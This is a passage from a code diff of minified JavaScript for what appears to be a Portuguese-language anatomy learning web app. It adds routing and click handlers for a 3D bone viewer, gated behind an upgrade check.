+  if(location.hash==="#3d"&&USER){if(FREE()){renderLevels();renderRewards();show("trilha");openUpgrade();return;}show("3d");window.scrollTo(0,0);abrir3D();return;}renderLevels();renderRewards();show("trilha");}
 document.addEventListener("click",e=>{
   const m=e.target.closest("[data-mod]");
   if(m){curMod=m.dataset.mod;const st=load();st.mod=curMod;save(st);renderLevels();return;}
@@ -1882,6 +1992,10 @@ const demo=[["esqueleto","p:femur","fêmur · o maior osso do corpo"],["orgaos",
 let di=0, heroView=null; const tick=()=>{const [v,h,t]=demo[di]; if(v!==heroView){buildView(hero,v,false);heroView=v;} highlight(hero,[h]);$("#hero-tag").textContent=t;di=(di+1)%demo.length;};
 tick(); if(!matchMedia("(prefers-reduced-motion: reduce)").matches) setInterval(tick,2200);
 
+$("#g-3d").addEventListener("click",()=>{if(DEMO){demo3d=!demo3d;sync3d();return;}if(FREE()){openUpgrade();return;}const st=load();st.modo3d=!want3d();save(st);sync3d();});
+document.addEventListener("click",e=>{const b=e.target.closest("[data-v3]");if(b&&V3){V3.vista(b.dataset.v3);return;}
+  const r=e.target.closest("[data-xr]");if(r&&V3){V3.regiao(r.dataset.xr,{ms:0});document.querySelectorAll("[data-xr]").forEach(x=>x.setAttribute("aria-pressed",String(x===r)));$("#x3d-info").innerHTML="Toque em um osso para ver o nome.";return;}
+  const x=e.target.closest("[data-x3]");if(x&&V3){x.dataset.x3==="centro"?(V3.limpar(),V3.centralizar(),$("#x3d-info").innerHTML="Toque em um osso para ver o nome."):V3.vista(x.dataset.x3);}});
 $("#g-sound").addEventListener("click",()=>{setMute(!muted);if(!muted){ac();sfx.right();}});
 setMute(muted);
 buildKb(); PROG=load().guest||{}; if(DEMO)document.body.classList.add("demo"); route(); initAuth();
